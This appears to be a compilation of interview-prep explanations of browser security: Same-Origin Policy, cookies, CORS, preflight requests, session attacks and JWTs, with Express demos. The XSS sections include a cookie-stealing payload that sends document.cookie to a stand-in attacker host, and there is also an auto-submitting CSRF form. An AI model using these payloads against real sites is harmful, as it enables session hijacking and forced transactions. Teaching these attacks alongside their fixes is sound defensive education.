# 🔐 **Same-Origin Policy (SOP)**

### **Definition**

The **Same-Origin Policy** is a critical browser security mechanism that **restricts how documents or scripts loaded from one origin can interact with resources from another origin**.

This prevents malicious sites from reading sensitive data from another site the user is logged into.

---

## 📍 **What is an Origin?**

An **origin** is defined by the combination of:

1. **Scheme (protocol)** → `http://` vs `https://`
2. **Host (domain)** → `example.com`
3. **Port** → `:80`, `:443`, `:3000`

👉 Two URLs have the same origin **only if all three match**.

### Example:

* `https://example.com:443/page1`
* `https://example.com/page2` → ✅ same origin (default https uses port 443).
* `http://example.com/page1` → ❌ different origin (scheme mismatch).
* `https://api.example.com/page1` → ❌ different origin (subdomain mismatch).
* `https://example.com:8443/page1` → ❌ different origin (port mismatch).

---

## 🛡️ **What SOP Restricts**

By default, SOP **blocks cross-origin access** to:

* **DOM access** → A script from `evil.com` can’t read or modify DOM of `bank.com`.
* **Cookies** → JS from `evil.com` can’t read cookies of `bank.com`.
* **LocalStorage / SessionStorage** → Isolated per origin.
* **IndexedDB** → Isolated per origin.
* **AJAX / Fetch** → Cannot freely fetch data from another origin unless the server explicitly allows it (CORS).

---

## ✅ **What’s Allowed**

* Embedding resources (cross-origin **reads**, but no direct access to content):

  * `<img src="https://other.com/pic.png" />`
  * `<script src="https://cdn.com/lib.js"></script>`
  * `<link rel="stylesheet" href="https://fonts.googleapis.com/...">`
  * `<iframe src="https://other.com"></iframe>` (but **no DOM access** inside without special headers like `postMessage`).

---

## 🌍 **How SOP Works with Other Mechanisms**

### **1. CORS (Cross-Origin Resource Sharing)**

* Controlled relaxation of SOP.
* Server sets response headers like:

  ```http
  Access-Control-Allow-Origin: https://example.com
  ```
* Allows specific origins to access resources.

### **2. JSONP (Old workaround)**

* Before CORS, developers used `<script>` tags (not restricted by SOP) to fetch cross-origin JSON.
* Now obsolete, replaced by CORS.

### **3. postMessage (Safe cross-origin communication)**

* For communication between iframes or windows across origins.

### **4. Sandbox / CSP**

* Content Security Policy & iframe `sandbox` attribute further restrict what embedded origins can do.

---

## ⚡ **Why SOP Exists**

Imagine:

* You’re logged into `bank.com`.
* You visit `evil.com`.
* Without SOP, `evil.com` could run JS like:

  ```js
  fetch("https://bank.com/account")
    .then(res => res.text())
    .then(console.log);
  ```

  …and steal your bank data using your cookies/session.
* SOP prevents that — the request may succeed, but `evil.com` can’t read the response unless `bank.com` allows it via CORS.

---

## ✅ **Senior-Level Interview Answer**

“The Same-Origin Policy is a browser-enforced security model that ensures scripts from one origin can’t freely read or manipulate resources from another origin. An origin is defined by scheme, host, and port. SOP protects access to DOM, cookies, localStorage, IndexedDB, and AJAX responses. Cross-origin embedding is allowed (like `<img>` or `<script>`), but access to embedded content is restricted. To allow controlled cross-origin access, we use CORS, or structured messaging like `postMessage`. SOP is the backbone of web security, preventing malicious sites from stealing data across domains.”

---

## 🔍 **Follow-up Questions Interviewers Might Ask**

1. **How does CORS relax SOP?**

   * Explain preflight requests (`OPTIONS`), `Access-Control-Allow-*` headers.

2. **What’s the difference between SOP and CSRF?**

   * SOP blocks reading responses. CSRF abuses authenticated requests (server-side vulnerability).

3. **Can SOP prevent XSS attacks?**

   * No, SOP doesn’t stop injection in the same origin. CSP is needed there.

4. **How do iframes bypass SOP safely?**

   * Through `window.postMessage`.

---

Perfect 👌 this is a very **senior-level deep dive** question — not just knowing the theory of Same-Origin Policy (SOP), but **demonstrating practical examples of how each restriction applies in real browser contexts**. Let’s go one by one.

---

# 🔐 **Examples of SOP Restrictions**

---

## 1️⃣ **DOM Access Restriction**

👉 **Scenario**:
You embed an iframe from another domain (`bank.com`) into your site (`evil.com`).

```html
<!-- evil.com -->
<iframe id="bankFrame" src="https://bank.com/dashboard"></iframe>
<script>
  const frame = document.getElementById("bankFrame");

  try {
    // Attempt to access DOM of bank.com
    console.log(frame.contentWindow.document.body.innerHTML);
  } catch (err) {
    console.error("Blocked by Same-Origin Policy:", err);
  }
</script>
```

🚫 The browser throws **“Blocked a frame with origin 'evil.com' from accessing a cross-origin frame.”**

✅ Allowed only if both pages share the same origin **or** `bank.com` explicitly relaxes with `document.domain` (rare, discouraged).

---

## 2️⃣ **Cookies Restriction**

👉 **Scenario**:
You are logged into `bank.com` and the browser stores cookies:

```http
Set-Cookie: sessionId=12345; Secure; HttpOnly; SameSite=None
```

Now, from `evil.com`:

```js
console.log(document.cookie);  // returns only evil.com cookies
```

🚫 Cookies from `bank.com` are **invisible** to `evil.com` JS.

🔑 Important:

* Cookies **are still automatically sent with requests** from the browser to `bank.com` (e.g., in an `<img>` or `fetch`), but **cannot be read** by the attacker’s JS.
* This distinction is key in CSRF attacks (attacker can send, but not read).

---

## 3️⃣ **LocalStorage / SessionStorage Restriction**

👉 **Scenario**:
On `bank.com`:

```js
localStorage.setItem("balance", "5000");
```

Now, from `evil.com`:

```js
console.log(localStorage.getItem("balance"));  // null
```

🚫 Each origin has its own **completely separate storage bucket**.
Even if both domains are on the same TLD (`bank.com` vs `evil.bank.com`), storage is **still isolated**.

---

## 4️⃣ **IndexedDB Restriction**

👉 **Scenario**:
On `bank.com`:

```js
let request = indexedDB.open("BankDB", 1);
```

On `evil.com`:

```js
let request = indexedDB.open("BankDB", 1);
// This opens evil.com’s *own* empty DB, not bank.com’s DB.
```

🚫 IndexedDB databases are isolated per origin.
Even if you know the DB name (`BankDB`), you **cannot access another origin’s DB**.

---

## 5️⃣ **AJAX / Fetch Restriction**

👉 **Scenario**:
On `evil.com`, you try:

```js
fetch("https://bank.com/api/account")
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));
```

🚫 Without CORS headers from `bank.com`, the browser blocks access:

**Network tab**: Request is sent ✅ (with cookies).
**JS code**: Response is blocked ❌ → “CORS policy: No 'Access-Control-Allow-Origin' header present.”

✅ If `bank.com` explicitly sets:

```http
Access-Control-Allow-Origin: https://evil.com
```

then the fetch works.

---

# 🔑 **Summary Table**

| Resource                  | Can `evil.com` Access `bank.com`’s Data? | Example Outcome                           |
| ------------------------- | ---------------------------------------- | ----------------------------------------- |
| **DOM** (iframe)          | ❌ No                                     | `frame.contentWindow.document` → Blocked  |
| **Cookies (JS access)**   | ❌ No                                     | `document.cookie` → Only evil.com cookies |
| **Cookies (sent in req)** | ✅ Yes (but unreadable)                   | Fetch/Img → sent silently                 |
| **LocalStorage**          | ❌ No                                     | `localStorage.getItem("balance")` → null  |
| **SessionStorage**        | ❌ No                                     | Isolated to origin & tab                  |
| **IndexedDB**             | ❌ No                                     | New empty DB created per origin           |
| **AJAX / Fetch**          | ❌ Blocked unless CORS enabled            | Response blocked                          |

---

# 🧠 Interviewer-Level Deep Dives

They may ask:

1. **Why are cookies still sent with cross-origin requests if JS can’t read them?**

   * Because cookies are part of HTTP authentication, SOP protects reading, not sending → leads to **CSRF risks**.

2. **How does SameSite cookie attribute interact with SOP?**

   * `SameSite=Strict` prevents cookies being sent on cross-site requests → reduces CSRF.

3. **How do subdomains behave under SOP?**

   * `bank.com` vs `app.bank.com` are different origins unless cookie is set with `Domain=bank.com`.

4. **Why can `<img src="bank.com/pic.jpg">` work but fetch is blocked?**

   * Because embedding resources is safe (no access to response body). Fetch tries to expose body to JS, hence blocked.

---

👉 Do you want me to also make a **real-world attack scenario walkthrough (step-by-step, with evil.com trying to exfiltrate bank.com’s data)** to show **why SOP is so critical**? That’s something interviewers love as it demonstrates practical security awareness.


Absolutely — this is a subtle but **crucial point** that often confuses even experienced developers. Let’s break it down in detail.

---

# **Cookies: Sent but Unreadable – What Does It Mean?**

When we say **“cookies are sent but unreadable”**, we’re talking about **the distinction between HTTP-level transmission and JavaScript access**.

---

## **1️⃣ Browser Sends Cookies Automatically**

* When you visit a site like `evil.com`, the browser **automatically attaches cookies** for requests made to `bank.com` if they exist and are valid.
* This happens **even for cross-origin requests**, unless restricted by the `SameSite` attribute.

Example:

```js
// From evil.com
fetch("https://bank.com/api/account")
  .then(res => res.json())
  .catch(err => console.error(err));
```

* **Request headers sent by the browser include cookies**:

```
GET /api/account HTTP/1.1
Host: bank.com
Cookie: sessionId=12345; authToken=abcde
```

✅ The request goes through. Bank sees the user is logged in.

---

## **2️⃣ JavaScript Cannot Read Cookies (SOP Restriction)**

* SOP prevents `evil.com` from reading the **response body** of the request **or reading `document.cookie` of `bank.com`**.

```js
// From evil.com
fetch("https://bank.com/api/account")
  .then(res => res.json())  // ❌ blocked by CORS/SOP
```

* The cookies were sent, so the server will authenticate the request, **but the response cannot be accessed by JS**.
* Also:

```js
console.log(document.cookie); // Only shows evil.com cookies, NOT bank.com cookies
```

So, the **cookies exist on the client and are sent to bank.com automatically**, but **JavaScript on evil.com cannot read their values**.

---

## **3️⃣ Why This Happens**

* **SOP prevents reading cross-origin resources.**
* Cookies are sent for authentication, but reading them directly would allow malicious sites to steal sensitive session information.
* This is why the browser **distinguishes between “sending cookies with requests” and “exposing cookies to JavaScript”**.

---

## **4️⃣ Visual Analogy**

Think of it like a **sealed envelope**:

| Action                              | Analogy                                    | Can evil.com do it?   |
| ----------------------------------- | ------------------------------------------ | --------------------- |
| Browser sends cookies automatically | Mail carrier delivers envelope to bank.com | ✅ Yes                 |
| JS reads cookies content            | Evil.com opens envelope                    | ❌ No (blocked by SOP) |
| Server reads cookies                | Bank.com opens envelope                    | ✅ Yes                 |

---

## **5️⃣ Interaction with `SameSite` and `HttpOnly`**

* **HttpOnly**: prevents JS from accessing cookies (`document.cookie`) even on same origin.
* **SameSite**: controls whether cookies are sent on cross-site requests:

| SameSite value | Sent on cross-origin?                          |
| -------------- | ---------------------------------------------- |
| Strict         | ❌ No                                           |
| Lax            | ✅ Yes (top-level GET navigation only)          |
| None + Secure  | ✅ Yes (cross-site requests allowed over HTTPS) |

So SOP + cookie attributes together enforce **secure authentication without exposing secrets to malicious JS**.

---

### ✅ **Interview-Level Answer**

“When we say cookies are sent but unreadable in the context of SOP, it means: the browser **automatically attaches cookies** for cross-origin requests, so servers see authenticated requests, but **JavaScript from a different origin cannot read the cookie values or the response body**. This ensures that sensitive session information cannot be exfiltrated, while still allowing cookies to serve their purpose in authentication.”

---


Perfect — this is the natural follow-up to SOP and cookies, and a **senior interviewer will expect you to explain both CORS and preflight in detail**. Let’s break it down carefully.

---

# **CORS (Cross-Origin Resource Sharing)**

### **Definition**

CORS is a **browser mechanism that allows controlled relaxation of the Same-Origin Policy (SOP)**.
It tells the browser: *“It’s safe to let JavaScript on this origin access this resource.”*

* Implemented via **HTTP headers sent by the server**.
* Without CORS, SOP blocks cross-origin `fetch`, `XHR`, or `WebSocket` responses from being accessed by JS.

---

### **How It Works**

1. **Browser makes a request** to a cross-origin resource.
2. **Server responds with special headers** indicating which origins are allowed.
3. **Browser enforces the rule**: JS can only read the response if the headers allow it.

**Key Response Headers**:

| Header                             | Purpose                                   |
| ---------------------------------- | ----------------------------------------- |
| `Access-Control-Allow-Origin`      | Specifies allowed origin(s) (`*` for all) |
| `Access-Control-Allow-Methods`     | Allowed HTTP methods (`GET, POST`)        |
| `Access-Control-Allow-Headers`     | Allowed custom headers                    |
| `Access-Control-Allow-Credentials` | Whether cookies/auth headers are allowed  |
| `Access-Control-Expose-Headers`    | Which headers JS can access               |

---

### **Example**

```js
// Frontend (evil.com)
fetch("https://bank.com/api/account")
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));
```

```http
// Response headers from bank.com
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

✅ JS can now read the response because the server explicitly allowed it.

---

# **Preflight Requests**

### **Definition**

A **preflight request** is an **OPTIONS HTTP request** that the browser sends **before the actual request** to check if the server permits it.

* Triggered when the request is **“non-simple”**:

**Non-simple request triggers preflight if:**

* Method is not GET, POST, or HEAD (e.g., PUT, DELETE).
* Custom headers are set (like `Content-Type: application/json` or `Authorization`).
* Content type is not `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.

### **Steps**

1. Browser sends **OPTIONS request** to the server:

```http
OPTIONS /api/account HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

2. Server responds with allowed methods/headers/origins:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

3. Browser now sends the **actual request** (`POST` in this case) because the server approved it.

---

### **Why Preflight Exists**

* Ensures that **destructive or unusual requests** (like PUT or DELETE) are **explicitly allowed by the server**.
* Protects servers from cross-origin requests that could be unsafe.

---

### **Senior-Level Example (Next.js / Express)**

**Server: Express.js**

```js
import express from "express";
import cors from "cors";

const app = express();

app.use(cors({
  origin: "https://evil.com",
  methods: ["GET", "POST"],
  credentials: true
}));

app.post("/api/account", (req, res) => {
  res.json({ balance: 5000 });
});

app.listen(3000);
```

**Client: evil.com**

```js
fetch("https://bank.com/api/account", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include"
})
.then(res => res.json())
.then(console.log)
.catch(console.error);
```

* Browser sends **preflight OPTIONS** automatically.
* Server responds with `Access-Control-Allow-*`.
* Browser then sends actual POST request.

---

### ✅ **Interview-Level Answer**

“CORS is a browser security mechanism that allows cross-origin JavaScript requests only if the server explicitly permits it via response headers like `Access-Control-Allow-Origin`. For ‘non-simple’ requests — e.g., custom headers or methods like PUT — the browser first sends a **preflight OPTIONS request** to check the server’s policy. Only if the preflight response authorizes the request does the browser send the actual request. This prevents malicious sites from silently performing unsafe cross-origin actions.”

---

### 🔍 **Follow-up Questions You Might Face**

1. **What’s the difference between SOP and CORS?**

   * SOP is a browser-enforced restriction; CORS is a controlled relaxation enforced via server headers.

2. **What are simple requests?**

   * GET, POST, HEAD with standard content types and no custom headers.

3. **Why does `fetch` with credentials require `Access-Control-Allow-Credentials: true`?**

   * SOP blocks reading cross-origin responses containing credentials unless server explicitly allows it.

4. **Can preflight requests be cached?**

   * Yes, using `Access-Control-Max-Age` header to reduce network overhead.

---

Great idea 🚀 — hands-on demos really lock in SOP and CORS concepts. Let’s build **two small Express servers**:

* **bank.com server (port 4000)** → simulates a secure API with cookies/session.
* **evil.com server (port 3000)** → simulates an attacker site trying to access bank.com’s data.

---

## **Step 1: Setup**

```bash
mkdir sop-cors-demo && cd sop-cors-demo
npm init -y
npm install express cors cookie-parser
```

---

## **Step 2: bank.com server (protected API)**

Create `bank.js`:

```js
const express = require("express");
const cookieParser = require("cookie-parser");
const app = express();

app.use(cookieParser());
app.use(express.json());

// Set a cookie to simulate login session
app.get("/login", (req, res) => {
  res.cookie("sessionId", "abc123", {
    httpOnly: false,   // for demo only! in real apps use httpOnly:true
    sameSite: "None",
    secure: false      // for demo, secure:true is needed over HTTPS
  });
  res.send("Logged in, session cookie set.");
});

// Protected API
app.get("/api/account", (req, res) => {
  if (req.cookies.sessionId === "abc123") {
    res.json({ balance: 5000, user: "John Doe" });
  } else {
    res.status(401).json({ error: "Unauthorized" });
  }
});

// No CORS enabled by default here
app.listen(4000, () => console.log("Bank server running on http://localhost:4000"));
```

---

## **Step 3: evil.com server (attacker site)**

Create `evil.js`:

```js
const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send(`
    <h2>Evil Site</h2>
    <button onclick="steal()">Try to steal account info</button>
    <script>
      function steal() {
        // SOP will block reading response
        fetch("http://localhost:4000/api/account", {
          credentials: "include"
        })
        .then(res => res.json())
        .then(data => console.log("Got data:", data))
        .catch(err => console.error("Blocked by SOP/CORS:", err));
      }
    </script>
  `);
});

app.listen(3000, () => console.log("Evil site running on http://localhost:3000"));
```

---

## **Step 4: Run Servers**

Open two terminals:

```bash
node bank.js
node evil.js
```

1. Go to **[http://localhost:4000/login](http://localhost:4000/login)** → sets a cookie (`sessionId=abc123`).
2. Open **[http://localhost:3000](http://localhost:3000)** (evil site).
3. Click **Try to steal account info** →

   * Browser **sends cookies to bank.com** ✅
   * But response is **blocked by SOP** ❌ (check console: “CORS policy error”).

---

## **Step 5: Allow CORS on bank.com**

Now modify `bank.js`:

```js
const cors = require("cors");

// Allow evil.com to access
app.use(cors({
  origin: "http://localhost:3000",
  credentials: true
}));
```

Restart bank server.
Now repeat step 4.

➡️ This time, evil.com **can read the response** (`{ balance: 5000, user: "John Doe" }`) because CORS allowed it.

---

## **Step 6: Preflight Demo**

Modify evil site to send a **non-simple request** (with custom header):

```html
<script>
function steal() {
  fetch("http://localhost:4000/api/account", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-Custom": "evil" },
    credentials: "include"
  })
  .then(res => res.json())
  .then(data => console.log("Got data:", data))
  .catch(err => console.error("Blocked by Preflight:", err));
}
</script>
```

Now, when you click the button:

* Browser sends a **preflight OPTIONS** request first.
* If bank.com does **not** reply with `Access-Control-Allow-Headers: X-Custom`, the request fails.
* Add this to `bank.js` CORS config:

```js
app.use(cors({
  origin: "http://localhost:3000",
  methods: ["GET", "POST"],
  allowedHeaders: ["Content-Type", "X-Custom"],
  credentials: true
}));
```

Now POST works because the preflight passes.

---

✅ With these steps, you’ve **hands-on demonstrated**:

* SOP blocking DOM & cookies.
* Cookies being sent but unreadable.
* CORS headers relaxing SOP.
* Preflight check for non-simple requests.

---

Great — let’s unpack cookies, how they’re used for sessions, the realistic threat-model, and concrete mitigations you’d use in production. I’ll give a short interview-ready summary first, then dive deeper with examples and defenses.

---

# Short interview-ready summary

**Cookies** are small name/value pairs the browser stores and sends automatically with requests to matching origins. They’re commonly used to persist **session identifiers** (session IDs) so the server can authenticate subsequent requests. Major attacks against cookies/session systems are **XSS (steal cookies)**, **CSRF (force authenticated actions)**, **session fixation (reuse a known session id)**, and **network-level theft (MITM / sidejacking)**. Mitigations: `HttpOnly`, `Secure`, `SameSite`, short/rotating session IDs, TLS, CSRF tokens or SameSite, server-side session invalidation/rotation, and signed/encrypted cookies.

---

# 1) Cookies — what they are & important attributes

A cookie is: `Set-Cookie: name=value; Attr1=...; Attr2=...`

Key attributes and what they do:

* **`Domain` / `Path`** — scope of which hosts/paths get the cookie.
* **`Expires` / `Max-Age`** — lifetime; session cookie if missing.
* **`Secure`** — browser only sends cookie over **HTTPS**.
* **`HttpOnly`** — JavaScript (`document.cookie`) cannot read this cookie.
* **`SameSite`** (`Strict`/`Lax`/`None`) — controls sending on cross-site requests to mitigate CSRF.

  * `Strict`: not sent on cross-site navigations.
  * `Lax`: sent for top-level GET navigations (good default).
  * `None` + `Secure`: allow cross-site (required for third-party cookies).
* **Signed/Encrypted** — server may HMAC or encrypt cookie value to prevent tampering.

---

# 2) How cookies are used for sessions (typical flow)

1. User authenticates (POST `/login` with credentials).
2. Server creates a **session record** (in Redis/DB/memory) and generates a random **session ID** (secure random token).
3. Server sets cookie: `Set-Cookie: sid=RANDOMTOKEN; HttpOnly; Secure; SameSite=Lax; Path=/;`
4. Browser stores cookie and **automatically sends** `Cookie: sid=RANDOMTOKEN` on subsequent requests to the origin.
5. Server looks up session by `sid` and authorizes actions.

Alternatives:

* **Stateless**: store JWT in cookie (be careful — JWT revocation/rotation adds complexity).
* **Signed cookies**: server encodes state in cookie and signs it (keeps server stateless but must handle key rotation).

Best practices:

* Use cryptographically secure random session IDs (≥ 128 bits).
* Store session state server-side (Redis) and store only the ID client-side.
* Regenerate session ID on privilege change (login, role change) to prevent fixation.
* Short lifetimes; sliding expiration if user active.

---

# 3) Concrete attacks & how they work

### A. Cross-Site Scripting (XSS) — *cookie theft*

* **What**: Attacker injects JS into a page on your origin (e.g., via unsanitized user input).
* **Impact**: If cookies are accessible via `document.cookie`, malicious JS can read them and exfiltrate — attacker gets valid `sid` and can impersonate user.
* **Example payload**: `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
* **Mitigation**:

  * `HttpOnly` cookies (prevents JS reading cookie).
  * Strong input validation & output encoding (CSP helps).
  * Content Security Policy (CSP) to reduce risk of script injection/exfiltration.

### B. Cross-Site Request Forgery (CSRF) — *forced actions*

* **What**: Attacker causes victim’s browser to send a request (with cookies automatically) to your site that performs an action (e.g., transfer money).
* **Why cookies are “sent but unreadable” matters**: The attacker can trigger requests but cannot read the responses.
* **Example**: malicious form auto-submits `<form action="https://bank.com/transfer" method="POST"><input name="amount" value="1000"/></form>` on user visit.
* **Mitigation**:

  * Use `SameSite=Lax`/`Strict` (or `None` + Secure only if needed for third-party flows).
  * CSRF tokens: server issues unique token (double-submit or sync token in hidden form) validated on write requests.
  * Require explicit user actions (re-auth, confirm) for sensitive ops.
  * Use `Content-Type` restrictions and CORS on APIs.

### C. Session Fixation

* **What**: Attacker sets or forces a known session id for the victim (e.g., tricking them to use URL/session cookie) and then uses the ID after victim logs in.
* **Impact**: Attacker reuses a session that the victim authenticated in.
* **Mitigation**:

  * Regenerate session id on login (server-side session rotation).
  * Tie session to other indicators (IP, UA) cautiously — can hurt mobile users.
  * Avoid accepting session id from query params.

### D. Network-level theft (MITM / Sidejacking)

* **What**: Attacker sniffing requests (on insecure networks) steals cookies if transmitted in plaintext.
* **Mitigation**:

  * `Secure` attribute and always serve over HTTPS/TLS.
  * HSTS to avoid downgrade.
  * Use short-lived session tokens and rotate.

### E. Cookie Tampering / Poisoning

* **What**: If cookie stores sensitive state client-side and is not signed/encrypted, attacker can modify it.
* **Mitigation**:

  * Sign and/or encrypt cookie values; validate server-side.
  * Prefer server-side session storage.

### F. Cookie Replay / Brute Force

* **What**: Attacker obtains a cookie and replays it later; or brute-forces predictable session ids.
* **Mitigation**:

  * Use strong random tokens, rate-limit login, monitor anomalies, short expiry, revocation support.

# 4) Practical mitigations & defense-in-depth (checklist)

* **Always TLS**: `Secure` + HSTS + no mixed content.
* **HttpOnly**: prevents JS theft, but not a CSRF defense.
* **SameSite**: set to `Lax` by default; `Strict` for stricter protection. Use `None; Secure` only when third-party access is required.
* **Session rotation**: generate new session id on login/privilege change.
* **Short expiry & rotation**: limit window for stolen tokens. Implement refresh tokens securely.
* **Server-side session store**: keep minimal client-side state; store data server-side and invalidate centrally.
* **CSRF protections**: CSRF tokens (synchronizer pattern), or SameSite where sufficient. For APIs used cross-origin, require token in header and enforce CORS.
* **Input sanitization & CSP**: prevent XSS (primary attack vector to steal cookies). Use nonce-based CSP where possible.
* **Sign/encrypt cookies**: use HMAC signing for cookie integrity if storing state or use JWT with short TTL and server-side revocation.
* **Monitor & detect**: suspicious IP/UA changes, rapid session reuse, login anomalies.
* **Limit cookie scope**: `Path` & `Domain` — narrow when possible.
* **Avoid storing secrets in cookies**: never store plaintext creds or secret data in cookies.

# 5) Design trade-offs: cookie vs localStorage vs Authorization header

* **Cookies**

  * Pros: automatic sending with requests; works with browser form submits; can set HttpOnly/Secure/SameSite.
  * Cons: vulnerable to CSRF if not protected; require careful attribute config.
* **localStorage**

  * Pros: easy JS access, large capacity.
  * Cons: accessible to JS (XSS risk) — not suitable for sensitive tokens unless additional protections are present.
* **Authorization header with Bearer token**

  * Pros: immune to CSRF if token is not automatically attached; better for APIs when client explicitly sets header.
  * Cons: token must be stored somewhere — often in memory or localStorage; still vulnerable to XSS if stored in JS-accessible storage.

Common pattern for SPAs:

* Store session token in **HttpOnly cookie**, use CSRF tokens/SameSite for site forms; or store short-lived access token in memory and refresh via secure cookie refresh token.

---

# 6) Concrete examples (attack & fix)

### XSS cookie theft (bad):

```html
<!-- vulnerable page that echoes user input unsafely -->
<div id="comment"></div>
<script>
  document.getElementById('comment').innerHTML = location.search.slice(1);
</script>
```

Attacker: `https://site.com/?<script>fetch('https://attacker.com/?c='+document.cookie)</script>`

**Fix**: escape user content; set cookies `HttpOnly`; enable CSP.

### CSRF (bad):

Attacker page:

```html
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="10000"/>
</form>
<script>document.forms[0].submit()</script>
```

Because browser sends cookies automatically, bank may process it.

**Fix**: Use CSRF token checked server-side, or `SameSite=Lax/Strict`.

---

# 7) Operational best practices

* Rotate session signing keys and secret keys safely.
* Provide logout endpoint that invalidates session server-side (so stolen cookie can't be used after logout).
* Maintain audit logs and session revocation lists.
* Use 2FA for sensitive operations.
* Use secure cookie defaults via middleware e.g., `helmet`/cookie libraries.

# Closing interview-ready statement

“In practice, cookies are essential for sessions but are a frequent attack surface. Treat them as sensitive transport for ephemeral session IDs: secure them with TLS, HttpOnly, and SameSite; rotate and regenerate session IDs on login; server-side validate and limit session lifetime; and rely on CSRF tokens or SameSite to prevent cross-site actions. Prevent XSS rigorously because HttpOnly only protects against token theft via JS — it does not prevent the attacker from making actions on behalf of the user. Defense-in-depth is essential: combine secure cookie attributes, server-side session policies, CSP, input validation, and monitoring.”

Alright, let’s go deep into **JWT (JSON Web Tokens)** — this is a classic interview topic where they expect you to contrast with **cookies/sessions** and highlight tradeoffs.

---

# 🔹 What is a JWT?

* A **JSON Web Token (JWT)** is a **compact, URL-safe token** used for authentication and information exchange.
* It is **stateless** → server does not need to store user sessions, all info is inside the token.

A JWT has **three parts** (Base64URL encoded, separated by `.`):

```
header.payload.signature
```

### Example:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    // Header
eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.    // Payload
dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk // Signature
```

---

# 🔹 How it works

1. **User logs in** with credentials → server verifies them.
2. Server generates a JWT:

   * **Header**: `{ "alg": "HS256", "typ": "JWT" }`
   * **Payload**: `{ "userId": 123, "role": "admin", "exp": 1696780000 }`
   * **Signature**: `HMACSHA256(base64Url(header) + "." + base64Url(payload), secret)`
3. JWT is sent to client (often stored in **localStorage** or **HTTP-only cookie**).
4. For each request, client sends JWT (commonly in `Authorization: Bearer <token>` header).
5. Server verifies signature with secret/public key, trusts payload.

   * If expired or tampered → reject.

---

# 🔹 Benefits of JWTs

✅ **Stateless auth** → no server-side session store. Great for scalability & microservices.
✅ **Compact & URL-safe** → can be sent in headers, cookies, or query params.
✅ **Decentralized** → multiple services can verify token using shared secret or public key.
✅ **Can carry extra claims** (roles, permissions, org, exp).

---

# 🔹 Drawbacks / Risks

❌ **Bigger attack surface if stolen** → JWT is bearer token, anyone with it is "you".
❌ **Revocation is hard** → unlike server sessions, you can’t just delete it unless you maintain a blacklist.
❌ **Long expiry = dangerous** if leaked.
❌ **No built-in encryption** → payload is only **base64 encoded**, not secret.

---

# 🔹 Security Attacks Possible

1. **Token theft** (via XSS, localStorage leak, weak cookie flags).
2. **Replay attacks** → attacker reuses token until expiry.
3. **Algorithm confusion** → early JWT libraries allowed `"alg":"none"` bypass.
4. **Brute-force secret** → if HS256 secret is weak.

Mitigations:

* Always use **HTTPS**.
* Prefer **short-lived JWTs** + **refresh tokens**.
* Store in **HTTP-only Secure cookies** instead of localStorage.
* Implement **logout/invalidate** by keeping server-side blacklist/rotation.

---

# 🔹 Example in Express

```js
const express = require("express");
const jwt = require("jsonwebtoken");
const app = express();

const SECRET = "super-secret";

// Login endpoint -> issue token
app.post("/login", (req, res) => {
  // Normally validate username/password first
  const token = jwt.sign(
    { userId: 1, role: "admin" },  // payload
    SECRET,
    { expiresIn: "15m" }           // short-lived
  );
  res.json({ token });
});

// Protected endpoint -> verify token
app.get("/profile", (req, res) => {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];
  if (!token) return res.sendStatus(401);

  jwt.verify(token, SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    res.json({ message: "Hello " + user.role, user });
  });
});

app.listen(3000, () => console.log("Server running"));
```

# 🔹 JWT vs Cookie-Session

| Aspect      | JWT                 | Cookies/Session              |
| ----------- | ------------------- | ---------------------------- |
| Storage     | Client side         | Server side                  |
| Scalability | Good (stateless)    | Bad (session store required) |
| Revocation  | Hard                | Easy                         |
| Size        | Larger              | Small (just ID)              |
| Use case    | APIs, microservices | Traditional monolith apps    |
